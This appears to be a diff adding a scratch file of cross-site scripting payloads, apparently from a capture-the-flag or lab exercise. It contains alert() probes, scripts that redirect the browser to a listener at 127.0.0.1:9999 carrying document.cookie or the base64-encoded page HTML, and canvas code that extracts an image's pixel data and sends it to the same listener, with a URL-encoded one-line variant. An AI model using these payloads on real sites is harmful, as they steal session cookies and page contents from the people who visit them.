@@ -1,0 +1,34 @@
+<script>alert(document.location);</script>
+<img src=s onerror=alert(document.location);>
+
+
+<script>location.href="//127.0.0.1:9999/"+document.cookie;</script>
+
+DOM
+
+<script>location.href="//127.0.0.1:9999/"+btoa(document.children[0].innerHTML);</script>
+
+var c = document.createElement('canvas');
+var ctx = c.getContext('2d');
+var i = document.getElementsByTagName('img')[0];
+ctx.drawImage(i, 0, 0);
+var img = ctx.getImageData(0, 0, 530, 202);
+var k = img.data.join(',');
+location.href="//127.0.0.1:9999/"+btoa(k);
+
+
+
+<script>setTimeout(function() {var c = document.createElement('canvas');var ctx = c.getContext('2d');var i = document.getElementsByTagName('img')[0];ctx.drawImage(i, 0, 0);var img = ctx.getImageData(0, 0, 530, 202);var k = img.data.join(',');location.href="//127.0.0.1:9999/"%2bbtoa(k);}, 500);</script>
+
+
+k = ""; img.data.forEach(function(v){k += ","+v;});
+
+
+
+
+
+
+document.getElementsByTagName("html")[0].innerHTML
+document.body.innerHTML
+https://developer.mozilla.org/en-US/docs/Web/API/WindowBase64/Base64_encoding_and_decoding
+
